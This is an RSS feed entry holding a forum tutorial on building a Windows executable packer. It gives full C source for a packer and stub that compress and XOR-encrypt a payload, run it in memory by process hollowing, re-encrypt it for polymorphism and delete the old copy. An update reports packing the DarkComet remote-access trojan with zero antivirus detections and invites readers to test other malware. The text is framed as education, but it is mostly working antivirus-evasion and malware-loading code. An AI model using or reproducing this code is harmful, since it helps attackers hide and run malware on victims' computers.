@@ -1,0 +1,1818 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
+  <channel>
+    <title>Packers - Executable Compression and Data Obfuscation</title>
+    <link>https://d.clarkee.co.uk/t/packers-executable-compression-and-data-obfuscation/847</link>
+    <description>Greetings, all. The following paper will be documenting an example of executable compression, AKA _packers_ which I have developed over the past couple of days. Like _crypters_, I feel as though they are some form of hidden dark art of the underground communities. Though there are many publicly available packers out there (UPX, Themida, etc.), I have not seen many papers or articles on how to create them but I have happened to come across [Gunther&#39;s How to Write a Simple Executable Packer in C](https://www.google.com.au/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=1&amp;ved=0ahUKEwi2hM3ajpjOAhVJI5QKHa0kDz0QFggdMAA&amp;url=http%3A%2F%2Fwww.rohitab.com%2Fdiscuss%2Findex.php%3Fapp%3Dcore%26module%3Dattach%26section%3Dattach%26attach_id%3D4507&amp;usg=AFQjCNH_pvKsYDQ5Q70xsD-J1KmXWk-hfQ&amp;sig2=KYQyHixtZstB_FIOeuiAug&amp;cad=rja) which has enabled me to pursue further research on this enigmatic topic. After reading this, I hope all of you will gain an understanding of at least how these tools function.
+
+**Disclaimer**: The following material may not be beginner-friendly as it requires a fair amount of knowledge of Windows programming.
+
+```makefile
+Proficiency in C/C++
+Knowledge of the WinAPI and its documentation
+Knowledge of basic cryptography
+Knowledge of file compression
+Knowledge of the PE file structure
+```
+
+
+----------
+
+## An Introduction to Packers
+_Packers_ are a tool which are used for their spacial advantages and deterring reverse engineering attempts such as disassembly by obfuscating the data through compression. Because of the resulting data obfuscation characteristic, it allows malware developers to hide malicious code within executables to evade antivirus detection. This behavior is similar to that of crypters which use encryption for data obfuscation. Packers can also utilize the encryption method of crypters to provide a double layer of obfuscation where compression is the next _step_. Let&#39;s get a visual representation of a packed executable in action.
+
+The **packer** is responsible for compressing (and encrypting) the payload.
+
+```makefile
++---------+    +--------+    +------+--------------------------------+
+| Payload | -&gt; | Packer | =&gt; | Stub | Compressed + encrypted payload |
++---------+    +--------+    +------+--------------------------------+
+```
+The **stub** is the part of the executable which extracts (decrypts and decompresses) the payload for execution.
+```makefile
++------+--------------------------------+                 +------------------+
+| Stub | Compressed + encrypted payload | == execution =&gt; | Original payload |
++------+--------------------------------+                 +------------------+
+```
+
+
+----------
+
+## Coding the Packer
+The packer is required to compress and encrypt the payload, then add it to the stub. The following provides a possible packer design.
+
+### Packer Pseudocode
+```makefile
+1. Read the payload file into a buffer
+2. Update struct with a pointer to the buffer and its size 
+3. Compress the payload buffer
+4. Encrypt the buffer
+5. Create the stub output file
+6. Update the stub by adding the payload buffer
+```
+Here is the code for this design.
+```c
+#include &lt;stdio.h&gt;
+#include &lt;stdarg.h&gt;
+#include &lt;windows.h&gt;
+#include &lt;wincrypt.h&gt;
+#include &lt;zlib.h&gt;
+
+#include &quot;resource.h&quot;
+
+#define WIN32_LEAN_AND_MEAN
+#define DEBUG
+#define DEBUG_TITLE &quot;STUB - DEBUG MESSAGE&quot;
+
+#define BUFFER_RSRC_ID 10
+#define FILE_SIZE_RSRC_ID 20
+#define KEY_RSRC_ID 30
+
+#define KEY_LEN 64
+
+typedef struct _FileStruct {
+    PBYTE pBuffer;
+    DWORD dwBufSize;
+    DWORD dwFileSize;
+    PBYTE pKey;
+} FileStruct, *pFileStruct;
+
+VOID Debug(LPCSTR fmt, ...) {
+#ifdef DEBUG
+    va_list args;
+
+    va_start(args, fmt);
+    vprintf(fmt, args);
+
+    va_end(args);
+#endif
+}
+
+FileStruct *LoadFile(LPCSTR szFileName) {
+    Debug(&quot;Loading %s...\n&quot;, szFileName);
+
+    Debug(&quot;Initializing struct...\n&quot;);
+    FileStruct *fs = (FileStruct *)malloc(sizeof(*fs));
+    if (fs == NULL) {
+        Debug(&quot;Create %s file structure error: %lu\n&quot;, szFileName, GetLastError());
+        return NULL;
+    }
+
+    Debug(&quot;Initializing file...\n&quot;);
+    // get file handle to file
+    HANDLE hFile = CreateFile(szFileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        Debug(&quot;Create file error: %lu\n&quot;, GetLastError());
+        free(fs);
+        return NULL;
+    }
+
+    // get file size
+    Debug(&quot;Retrieving file size...\n&quot;);
+    fs-&gt;dwFileSize = GetFileSize(hFile, NULL);
+    if (fs-&gt;dwFileSize == INVALID_FILE_SIZE) {
+        Debug(&quot;Get file size error: %lu\n&quot;, GetLastError());
+        CloseHandle(hFile);
+        free(fs);
+        return NULL;
+    }
+    fs-&gt;dwBufSize = fs-&gt;dwFileSize;
+
+    // create heap buffer to hold file contents
+    fs-&gt;pBuffer = (PBYTE)malloc(fs-&gt;dwFileSize);
+    if (fs-&gt;pBuffer == NULL) {
+        Debug(&quot;Create buffer error: %lu\n&quot;, GetLastError());
+        CloseHandle(hFile);
+        free(fs);
+        return NULL;
+    }
+
+    // read file contents
+    Debug(&quot;Reading file contents...\n&quot;);
+    DWORD dwRead = 0;
+    if (ReadFile(hFile, fs-&gt;pBuffer, fs-&gt;dwFileSize, &amp;dwRead, NULL) == FALSE) {
+        Debug(&quot;Read file error: %lu\n&quot;, GetLastError());
+        CloseHandle(hFile);
+        free(fs);
+        return NULL;
+    }
+    Debug(&quot;Read 0x%08x bytes\n\n&quot;, dwRead);
+
+    // clean up
+    CloseHandle(hFile);
+
+    return fs;
+}
+
+BOOL UpdateStub(LPCSTR szFileName, FileStruct *fs) {
+    // start updating stub&#39;s resources
+    HANDLE hUpdate = BeginUpdateResource(szFileName, FALSE);
+    // add file as a resource to stub
+    if (UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(BUFFER_RSRC_ID), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), fs-&gt;pBuffer, fs-&gt;dwBufSize) == FALSE) {
+        Debug(&quot;Update resource error: %lu\n&quot;, GetLastError());
+        return FALSE;
+    }
+
+    // add file size as a resource to stub
+    if (UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(FILE_SIZE_RSRC_ID), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), (PVOID)&amp;fs-&gt;dwFileSize, sizeof(DWORD)) == FALSE) {
+        Debug(&quot;Update resource error: %lu\n&quot;, GetLastError());
+        return FALSE;
+    }
+
+    // add decryption key as a resource
+    if (UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(KEY_RSRC_ID), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), fs-&gt;pKey, KEY_LEN) == FALSE) {
+        Debug(&quot;Update resource error: %lu\n&quot;, GetLastError());
+        return FALSE;
+    }
+
+    EndUpdateResource(hUpdate, FALSE);
+
+    return TRUE;
+}
+
+BOOL BuildStub(LPCSTR szFileName, FileStruct *fs) {
+    Debug(&quot;Building stub: %s...\n&quot;, szFileName);
+
+    // get stub program as a resource
+    HRSRC hRsrc = FindResource(NULL, MAKEINTRESOURCE(1), &quot;STUB&quot;);
+    if (hRsrc == NULL) {
+        Debug(&quot;Find stub resource error: %lu\n&quot;, GetLastError());
+        return FALSE;
+    }
+    DWORD dwSize = SizeofResource(NULL, hRsrc);
+
+    HGLOBAL hGlobal = LoadResource(NULL, hRsrc);
+    if (hGlobal == NULL) {
+        Debug(&quot;Load stub resource error: %lu\n&quot;, GetLastError());
+        return FALSE;
+    }
+
+    // get stub&#39;s file content
+    PBYTE pBuffer = (PBYTE)LockResource(hGlobal);
+    if (pBuffer == NULL) {
+        Debug(&quot;Lock stub resource error: %lu\n&quot;, GetLastError());
+        return FALSE;
+    }
+
+    // create output file
+    Debug(&quot;Creating stub...\n&quot;);
+    HANDLE hFile = CreateFile(szFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        Debug(&quot;Create stub error: %lu\n&quot;, GetLastError());
+        free(pBuffer);
+        return FALSE;    
+    }
+
+    // write stub content to output file
+    Debug(&quot;Writing payload to stub...\n&quot;);
+    DWORD dwWritten = 0;
+    if (WriteFile(hFile, pBuffer, dwSize, &amp;dwWritten, NULL) == FALSE) {
+        Debug(&quot;Write payload to stub error: %lu\n&quot;, GetLastError());
+        CloseHandle(hFile);
+        free(pBuffer);
+        return FALSE;
+    }
+    Debug(&quot;Wrote 0x%08x bytes\n\n&quot;);
+
+    CloseHandle(hFile);
+
+    // add payload to stub
+    Debug(&quot;Updating stub with payload...\n&quot;);
+    if (UpdateStub(szFileName, fs) == FALSE)
+        return FALSE;
+
+    return TRUE;
+}
+
+BOOL GenerateKey(FileStruct *fs) {
+    fs-&gt;pKey = (PBYTE)malloc(KEY_LEN);
+    if (fs-&gt;pKey == NULL) return FALSE;
+
+    // initialize crypto service provider
+    HCRYPTPROV hProv = NULL;
+    if (CryptAcquireContext(&amp;hProv, NULL, NULL, PROV_RSA_FULL, 0) == FALSE) {
+        Debug(&quot;Crypt aquire context error: %lu\n&quot;, GetLastError());
+        free(fs-&gt;pKey);
+        return FALSE;
+    }
+
+    // generate secure bytes
+    Debug(&quot;Generating cryptographically secure bytes...\n&quot;);
+    if (CryptGenRandom(hProv, KEY_LEN, fs-&gt;pKey) == FALSE) {
+        Debug(&quot;Generate random key error: %lu\n&quot;, GetLastError());
+        free(fs-&gt;pKey);
+        return FALSE;
+    }
+    Debug(&quot;Using key: &quot;);
+    for (int i = 0; i &lt; KEY_LEN; i++)
+        Debug(&quot;0x%02x &quot;, fs-&gt;pKey[i]);
+    Debug(&quot;\n&quot;);
+
+    // clean up
+    CryptReleaseContext(hProv, 0);
+
+    return TRUE;
+}
+
+// XOR
+BOOL EncryptPayload(FileStruct *fs) {
+    Debug(&quot;EncryptPayloading payload...\n&quot;);
+
+    Debug(&quot;Generating key...\n&quot;);
+    if (GenerateKey(fs) == FALSE) return FALSE;
+
+    for (DWORD i = 0; i &lt; fs-&gt;dwBufSize; i++)
+        fs-&gt;pBuffer[i] ^= fs-&gt;pKey[i % KEY_LEN];
+
+    Debug(&quot;EncryptPayloadion routine complete\n&quot;);
+    return TRUE;
+}
+
+BOOL CompressPayload(FileStruct *fs) {
+    Debug(&quot;Compressing payload...\n&quot;);
+    
+    PBYTE pCompressedBuffer = (PBYTE)malloc(fs-&gt;dwBufSize);
+    ULONG ulCompressedBufSize = compressBound((ULONG)fs-&gt;dwBufSize);
+    compress(pCompressedBuffer, &amp;ulCompressedBufSize, fs-&gt;pBuffer, fs-&gt;dwBufSize);
+
+    fs-&gt;pBuffer = pCompressedBuffer;
+    fs-&gt;dwBufSize = ulCompressedBufSize;
+
+    Debug(&quot;Compression routine complete\n&quot;);
+    return TRUE;
+}
+
+int main(int argc, char *argv[]) {
+    printf(&quot;Copyright (C) 2016  93aef0ce4dd141ece6f5\n\n&quot;);
+    if (argc &lt; 3) {
+        Debug(&quot;Usage: %s [INPUT FILE] [OUTPUT FILE]\n&quot;, argv[0]);
+        return 1;
+    }
+
+    FileStruct *fs = LoadFile(argv[1]);
+    if (fs == NULL) return 1;
+
+    Debug(&quot;Applying obfuscation...\n&quot;);
+    if (CompressPayload(fs) == FALSE) {
+        free(fs);
+        return 1;
+    }
+
+    if (EncryptPayload(fs) == FALSE) {
+        free(fs);
+        return 1;
+    }
+    Debug(&quot;\n&quot;);
+
+    if (BuildStub(argv[2], fs) == FALSE) {
+        free(fs-&gt;pKey);
+        free(fs);
+        return 1;
+    }
+
+    // clean up
+    free(fs-&gt;pKey);
+    free(fs);
+
+    Debug(&quot;\nDone\n&quot;);
+
+    return 0;
+}
+```
+The `CompressPayload` function uses the [zLib](www.zlib.net) third party compression library to perform the compression routine on the payload buffer.
+
+The `EncryptPayload` function uses the XOR cipher method purely as an example. Use of other ciphers in place of the XOR such as RC4 or AES is entirely possible. There is a function within this function, `GenerateKey` which uses the WinAPI&#39;s Cryptography library to uniquely (for each execution of the program) generate a 32-bit length key using a CSPRNG.
+
+The `BuildStub` function creates and adds resources to the stub. These resources are the information stored inside the file struct `_FileStruct` as it is required in the routines within the stub itself. These resources will be visually shown after the stub code is covered.
+
+
+----------
+## Coding the Stub
+The stub is responsible for the extraction and execution of the payload. Note that it must be the reverse operation of the packer. The following shows a possible design.
+
+### Stub Pseudocode
+```makefile
+1. Extract the resources
+2. Decrypt the payload buffer
+3. Decompress the buffer
+4. Drop the payload
+5. Execute the payload
+```
+The code for this design is as follows.
+```cpp
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdarg.h&gt;
+#include &lt;windows.h&gt;
+#include &lt;wincrypt.h&gt;
+#include &lt;zlib.h&gt;
+
+#define WIN32_LEAN_AND_MEAN
+#define DEBUG
+#define DEBUG_TITLE &quot;STUB - DEBUG MESSAGE&quot;
+
+#define BUFFER_RSRC_ID 10
+#define FILE_SIZE_RSRC_ID 20
+#define KEY_RSRC_ID 30
+
+#define KEY_LEN 64
+
+typedef VOID(*PZUVOS)(HANDLE, PVOID);
+
+typedef struct _FileStruct {
+    PBYTE pBuffer;
+    DWORD dwBufSize;
+    DWORD dwFileSize;
+    PBYTE pKey;
+} FileStruct, *pFileStruct;
+
+VOID Debug(LPCSTR fmt, ...) {
+#ifdef DEBUG
+    CHAR szDebugBuf[BUFSIZ];
+    va_list args;
+
+    va_start(args, fmt);
+    vsprintf(szDebugBuf, fmt, args);
+    MessageBox(NULL, szDebugBuf, DEBUG_TITLE, MB_OK);
+
+    va_end(args);
+#endif
+}
+
+FileStruct *ExtractPayload(VOID) {
+    FileStruct *fs = (FileStruct *)malloc(sizeof(*fs));
+    if (fs == NULL) return NULL;
+
+    // get file buffer
+    // get size of resource
+    HRSRC hRsrc = FindResource(NULL, MAKEINTRESOURCE(BUFFER_RSRC_ID), RT_RCDATA);
+    if (hRsrc == NULL) {
+        Debug(&quot;Find buffer resource error: %lu\n&quot;, GetLastError());
+        free(fs);
+        return NULL;
+    }
+    fs-&gt;dwBufSize = SizeofResource(NULL, hRsrc);
+
+    // get pointer to resource buffer
+    HGLOBAL hGlobal = LoadResource(NULL, hRsrc);
+    if (hGlobal == NULL) {
+        Debug(&quot;Load buffer resource error: %lu\n&quot;, GetLastError());
+        free(fs);
+        return NULL;
+    }
+
+    fs-&gt;pBuffer = (PBYTE)LockResource(hGlobal);
+    if (fs-&gt;pBuffer == NULL) {
+        Debug(&quot;Lock buffer resource error: %lu\n&quot;, GetLastError());
+        free(fs);
+        return NULL;
+    }
+
+    // get actual file size resource
+    hRsrc = FindResource(NULL, MAKEINTRESOURCE(FILE_SIZE_RSRC_ID), RT_RCDATA);
+    if (hRsrc == NULL) {
+        Debug(&quot;Find file size error: %lu\n&quot;, GetLastError());
+        free(fs);
+        return NULL;
+    }
+
+    // get file size value
+    hGlobal = LoadResource(NULL, hRsrc);
+    if (hGlobal == NULL) {
+        Debug(&quot;Load buffer resource error: %lu\n&quot;, GetLastError());
+        free(fs);
+        return NULL;
+    }
+    fs-&gt;dwFileSize = *(LPDWORD)LockResource(hGlobal);
+
+    // get decryption key
+    hRsrc = FindResource(NULL, MAKEINTRESOURCE(KEY_RSRC_ID), RT_RCDATA);
+    if (hRsrc == NULL) {
+        Debug(&quot;Find key resource error: %lu\n&quot;, GetLastError());
+        free(fs);
+        return NULL;
+    }
+
+    // get pointer to key buffer
+    hGlobal = LoadResource(NULL, hRsrc);
+    if (hGlobal == NULL) {
+        Debug(&quot;Load key resource error: %lu\n&quot;, GetLastError());
+        free(fs);
+        return NULL;
+    }
+    fs-&gt;pKey = (PBYTE)LockResource(hGlobal);
+    if (fs-&gt;pKey == NULL) {
+        Debug(&quot;Lock buffer resource error: %lu\n&quot;, GetLastError());
+        free(fs);
+        return NULL;
+    }
+
+    return fs;
+}
+
+BOOL UpdateResources(FileStruct *fs, LPCSTR szFileName) {
+    HANDLE hUpdate = BeginUpdateResource(szFileName, FALSE);
+    // add file as a resource to stub
+    if (UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(BUFFER_RSRC_ID), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), fs-&gt;pBuffer, fs-&gt;dwBufSize) == FALSE) {
+        Debug(&quot;Update resource error: %lu\n&quot;, GetLastError());
+        return FALSE;
+    }
+
+    // add decryption key as a resource
+    if (UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(KEY_RSRC_ID), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), fs-&gt;pKey, KEY_LEN) == FALSE) {
+        Debug(&quot;Update resource error: %lu\n&quot;, GetLastError());
+        return FALSE;
+    }
+
+    if (EndUpdateResource(hUpdate, FALSE) == FALSE) {
+        Debug(&quot;End update resource error: %lu\n&quot;, GetLastError());
+    }
+
+    return TRUE;
+}
+
+BOOL GenerateKey(FileStruct *fs) {
+    fs-&gt;pKey = (PBYTE)malloc(KEY_LEN);
+    if (fs-&gt;pKey == NULL) return FALSE;
+
+    // initialize crypto service provider
+    HCRYPTPROV hProv = NULL;
+    if (CryptAcquireContext(&amp;hProv, NULL, NULL, PROV_RSA_FULL, 0) == FALSE) {
+        Debug(&quot;Crypt aquire context error: %lu\n&quot;, GetLastError());
+        free(fs-&gt;pKey);
+        return FALSE;
+    }
+
+    // generate secure bytes
+    //Debug(&quot;Generating cryptographically secure bytes...\n&quot;);
+    if (CryptGenRandom(hProv, KEY_LEN, fs-&gt;pKey) == FALSE) {
+        Debug(&quot;Generate random key error: %lu\n&quot;, GetLastError());
+        free(fs-&gt;pKey);
+        return FALSE;
+    }
+    /*
+    Debug(&quot;Using key: &quot;);
+    for (int i = 0; i &lt; KEY_LEN; i++)
+        Debug(&quot;0x%02x &quot;, fs-&gt;pKey[i]);
+    Debug(&quot;\n&quot;);
+    */
+
+    // clean up
+    CryptReleaseContext(hProv, 0);
+
+    return TRUE;
+}
+
+// XOR
+BOOL DecryptPayload(FileStruct *fs) {
+    PBYTE pDecryptPayloadedBuffer = (PBYTE)malloc(fs-&gt;dwBufSize);
+    if (pDecryptPayloadedBuffer == NULL) return FALSE;
+
+    for (DWORD i = 0; i &lt; fs-&gt;dwBufSize; i++)
+        pDecryptPayloadedBuffer[i] = fs-&gt;pBuffer[i] ^ fs-&gt;pKey[i % KEY_LEN];
+
+    fs-&gt;pBuffer = pDecryptPayloadedBuffer;
+
+    return TRUE;
+}
+
+// XOR
+BOOL Encrypt(FileStruct *fs) {
+    return DecryptPayload(fs);
+}
+
+BOOL DecompressPayload(FileStruct *fs) {
+    PBYTE pDecompressedBuffer = (PBYTE)malloc(fs-&gt;dwFileSize);
+    ULONG ulDecompressedBufSize;
+    uncompress(pDecompressedBuffer, &amp;ulDecompressedBufSize, fs-&gt;pBuffer, fs-&gt;dwFileSize);
+
+    fs-&gt;pBuffer = pDecompressedBuffer;
+    fs-&gt;dwBufSize = ulDecompressedBufSize;
+
+    return TRUE;
+}
+
+VOID DropAndExecutePayload(FileStruct *fs, LPCSTR szFileName) {
+    DWORD dwWritten;
+    HANDLE hFile = CreateFile(szFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    WriteFile(hFile, fs-&gt;pBuffer, fs-&gt;dwFileSize, &amp;dwWritten, NULL);
+    CloseHandle(hFile);
+    ShellExecute(NULL, NULL, szFileName, NULL, NULL, SW_NORMAL);
+}
+
+BOOL MemoryExecutePayload(FileStruct *fs) {
+    // PE headers
+    PIMAGE_DOS_HEADER pidh;
+    PIMAGE_NT_HEADERS pinh;
+    PIMAGE_SECTION_HEADER pish;
+
+    // process info
+    STARTUPINFO si;
+    PROCESS_INFORMATION pi;
+
+    // pointer to virtually allocated memory
+    LPVOID lpAddress = NULL;
+
+    // context of suspended thread for setting address of entry point
+    CONTEXT context;
+
+    // need function pointer for ZwUnmapViewOfSection from ntdll.dll
+    PZUVOS pZwUnmapViewOfSection = NULL;
+
+    // get file name
+    CHAR szFileName[MAX_PATH];
+    GetModuleFileName(NULL, szFileName, MAX_PATH);
+
+    // first extract header info 
+    // check if valid DOS header
+    pidh = (PIMAGE_DOS_HEADER)fs-&gt;pBuffer;
+    if (pidh-&gt;e_magic != IMAGE_DOS_SIGNATURE) {
+        Debug(&quot;DOS signature error&quot;);
+        return FALSE;
+    }
+
+    // check if valid pe file
+    pinh = (PIMAGE_NT_HEADERS)((DWORD)fs-&gt;pBuffer + pidh-&gt;e_lfanew);
+    if (pinh-&gt;Signature != IMAGE_NT_SIGNATURE) {
+        Debug(&quot;PE signature error&quot;);
+        return FALSE;
+    }
+
+    // first create process as suspended
+    memset(&amp;si, 0, sizeof(si));
+    memset(&amp;pi, 0, sizeof(pi));
+    si.cb = sizeof(si);
+    if (CreateProcess(szFileName, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &amp;si, &amp;pi) == FALSE) {
+        Debug(&quot;Create process error %lu\n&quot;, GetLastError());
+        return FALSE;
+    }
+
+    context.ContextFlags = CONTEXT_FULL;
+    if (GetThreadContext(pi.hThread, &amp;context) == FALSE) {
+        Debug(&quot;Get thread context&quot;);
+    }
+
+    // unmap memory space for our process
+    pZwUnmapViewOfSection = (PZUVOS)GetProcAddress(GetModuleHandle(&quot;ntdll.dll&quot;), &quot;ZwUnmapViewOfSection&quot;);
+    pZwUnmapViewOfSection(pi.hProcess, (PVOID)pinh-&gt;OptionalHeader.ImageBase);
+
+    // allocate virtual space for process
+    lpAddress = VirtualAllocEx(pi.hProcess, (PVOID)pinh-&gt;OptionalHeader.ImageBase, pinh-&gt;OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (lpAddress == NULL) {
+        Debug(&quot;Virtual alloc error: %lu\n&quot;, GetLastError());
+        return FALSE;
+    }
+
+    // write headers into memory
+    if (WriteProcessMemory(pi.hProcess, (PVOID)pinh-&gt;OptionalHeader.ImageBase, fs-&gt;pBuffer, pinh-&gt;OptionalHeader.SizeOfHeaders, NULL) == FALSE) {
+        Debug (&quot;Write headers error: %lu\n&quot;, GetLastError());
+        return FALSE;
+    }
+
+    // write each section into memory
+    for (int i = 0; i &lt; pinh-&gt;FileHeader.NumberOfSections; i++) {
+        // calculate section header of each section
+        pish = (PIMAGE_SECTION_HEADER)((DWORD)fs-&gt;pBuffer + pidh-&gt;e_lfanew + sizeof (IMAGE_NT_HEADERS) + sizeof (IMAGE_SECTION_HEADER) * i);
+        // write section data into memory
+        WriteProcessMemory(pi.hProcess, (PVOID)(pinh-&gt;OptionalHeader.ImageBase + pish-&gt;VirtualAddress), (LPVOID)((DWORD)fs-&gt;pBuffer + pish-&gt;PointerToRawData), pish-&gt;SizeOfRawData, NULL);
+    }
+
+    // set starting address at virtual address: address of entry point
+    context.Eax = pinh-&gt;OptionalHeader.ImageBase + pinh-&gt;OptionalHeader.AddressOfEntryPoint;
+    if (SetThreadContext(pi.hThread, &amp;context) == FALSE) {
+        Debug(&quot;Set thread context error: %lu\n&quot;, GetLastError());
+        return FALSE;
+    }
+
+    // resume our suspended processes
+    if (ResumeThread(pi.hThread) == -1) {
+        Debug(&quot;Resume thread error: %lu\n&quot;, GetLastError());
+        return FALSE;
+    }
+
+    WaitForSingleObject(pi.hProcess, INFINITE);
+
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+
+    return TRUE;
+}
+
+/*
+VOID RunFromMemory(FileStruct *fs) {
+    Debug(&quot;%p&quot;, fs-&gt;pBuffer);
+    HMEMORYMODULE hModule = MemoryLoadLibrary(fs-&gt;pBuffer, fs-&gt;dwFileSize);
+    if (hModule == NULL) {
+        Debug(&quot;Memory load library error: %lu\n&quot;, GetLastError());
+        return;
+    }
+
+    int nSuccess = MemoryCallEntryPoint(hModule);
+    if (nSuccess &lt; 0) {
+        Debug(&quot;Memory call entry point error: %d\n&quot;, nSuccess);
+    }
+
+    MemoryFreeLibrary(hModule);
+}
+*/
+
+VOID SelfDelete(LPCSTR szFileName) {
+    PROCESS_INFORMATION pi = { 0 };
+    STARTUPINFO si = { 0 };
+    si.cb = sizeof(si);
+    //CreateFile(&quot;old.exe&quot;, 0, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_DELETE_ON_CLOSE, NULL);
+    CHAR szCmdLine[MAX_PATH];
+    sprintf(szCmdLine, &quot;%s delete&quot;, szFileName);
+    if (CreateProcess(NULL, szCmdLine, NULL, NULL, FALSE, 0, NULL, NULL, &amp;si, &amp;pi) == FALSE) {
+        Debug(&quot;Create process error: %lu\n&quot;, GetLastError());
+    }
+}
+
+BOOL PolymorphPayload(LPCSTR szFileName) {
+    MoveFile(szFileName, &quot;old.exe&quot;);
+    CopyFile(&quot;old.exe&quot;, szFileName, FALSE);
+
+    // re-extract resources
+    FileStruct *fs = ExtractPayload();
+    if (fs == NULL) return FALSE;
+
+    // decrypt buffer
+    if (DecryptPayload(fs) == FALSE) {
+        Debug(&quot;DecryptPayload buffer error: %lu\n&quot;, GetLastError());
+        free(fs);
+        return FALSE;
+    }
+
+    // generate new key
+    if (GenerateKey(fs) == FALSE) {
+        Debug(&quot;Generate key error: %lu\n&quot;, GetLastError());
+        free(fs);
+        return FALSE;
+    }
+
+    // encrypt with new key
+    if (Encrypt(fs) == FALSE) {
+        Debug(&quot;Encrypt buffer error: %lu\n&quot;, GetLastError());
+        free(fs-&gt;pKey);
+        return FALSE;
+    }
+
+    // update resources
+    if (UpdateResources(fs, szFileName) == FALSE) {
+        free(fs-&gt;pKey);
+        free(fs);
+        return FALSE;
+    }
+
+    SelfDelete(szFileName);
+
+    free(fs-&gt;pKey);
+    free(fs);
+
+    return TRUE;
+}
+
+int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
+    if (strstr(GetCommandLine(), &quot;delete&quot;) != NULL) {
+        while (DeleteFile(&quot;old.exe&quot;) == FALSE);
+    } else {
+        FileStruct *fs = ExtractPayload();
+        if (fs == NULL) {
+            Debug(&quot;Extract file error: %lu\n&quot;, GetLastError());
+            return 1;
+        }
+
+        if (DecryptPayload(fs) == TRUE) {
+            if (DecompressPayload(fs) == TRUE)
+                //DropAndExecutePayload(fs, &quot;test.exe&quot;);
+                MemoryExecutePayload(fs);
+        }
+        free(fs-&gt;pBuffer);
+        free(fs);
+
+        CHAR szFileName[MAX_PATH];
+        GetModuleFileName(NULL, szFileName, MAX_PATH);
+        PolymorphPayload(szFileName);
+    }
+
+    return 0;
+}
+```
+The stub simply performs the reversal of the packer. After extracting the necessary information from the resources into the struct, it first deobfuscates the payload by decrypting and then decompressing the buffer with `DecryptPayload` and `DecompressPayload`. After a successful deobfuscation, the stub will simply drop the executable in the same directory and execute it. Of course, using the RunPE/Dynamic Forking method would eliminate any disk activity and the resulting forensics.
+
+
+----------
+## Resources and the PE File Format
+Here is a quick file analysis showing the resources within a file.
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/1X/200e9f8077ca5789342793e5e1d3145e6a2c1321.PNG&quot; width=&quot;690&quot; height=&quot;335&quot;&gt;
+
+The arrow shows the section for resources (.rsrc) and within the section is simply the resource which has been added to the binary. The labels in the red box on the left represent the different resources which exist in the PE file. Currently, PEView shows the `RCDATA` (raw data) for resource ID `000A` which, as seen from the code above, is the obfuscated payload.
+
+Here is the 32-byte key for the XOR cipher.
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/1X/d01749ce5235e32239e0b3c00872d3549ccc4157.PNG&quot; width=&quot;690&quot; height=&quot;379&quot;&gt;
+
+
+
+----------
+## Demonstration
+Here is a quick demonstration using putty.exe as the payload.
+
+Firstly, launching the packer to create the stub and to add an obfuscated payload.
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/1X/fe5927977bd9b70bf2e44a0cf2085332fb01f12c.PNG&quot; width=&quot;690&quot; height=&quot;204&quot;&gt;
+
+
+Off-screen, the size of putty.exe is ~512 KB while the stub is ~318 KB. Now, we can launch the generated stub.
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/1X/82f46341862a88074bbd517f99c75c763033c038.PNG&quot; width=&quot;690&quot; height=&quot;306&quot;&gt;
+As we can see, it dropped the deobfuscated payload `test.exe` and then executed it.
+
+
+----------
+## Update August 1, 2016
+### Added feature to execute packed payload directly from memory.
+I&#39;ve just added the RunPE method to my packer and it works perfectly (when compiled with MinGW). Here are some (non-distributing) virus scans with Dark Comet.
+[Majyx](https://scan.majyx.net/scans/result/37b1f15e43db4921cbf1ef1d3d149f58568e76d1) (0/35)
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/1X/a427fbc00c08df53efc73598c1aa2e61a8b21220.png&quot; width=&quot;500&quot; height=&quot;500&quot;&gt;
+[NoDistribute](http://nodistribute.com/result/b7yt9BLzH8Ge4RIK6unM) (0/35)
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/1X/fc03646dcb5133123ea3414b5d342cebfe50a9f2.png&quot; width=&quot;373&quot; height=&quot;500&quot;&gt;
+Please feel free to test other known malware with these two (or any other **NON** distributing virus scanning websites).
+
+### Added feature to polymorph packed payload
+Basically just re-encrypts the compressed payload with a new key.
+
+----------
+## Conclusion
+The only difficult aspect in this is understanding the resource management but other than that, it&#39;s a pretty simple concept. I&#39;ve added the necessary files to my [GitHub](https://github.com/93aef0ce4dd141ece6f5/Packer) including a compiled 32-bit binary.
+
+Thank you for reading.
+
+_-- dtm_</description>
+    
+    <lastBuildDate>Fri, 22 Dec 2017 00:41:57 +0000</lastBuildDate>
+    <category>Malware</category>
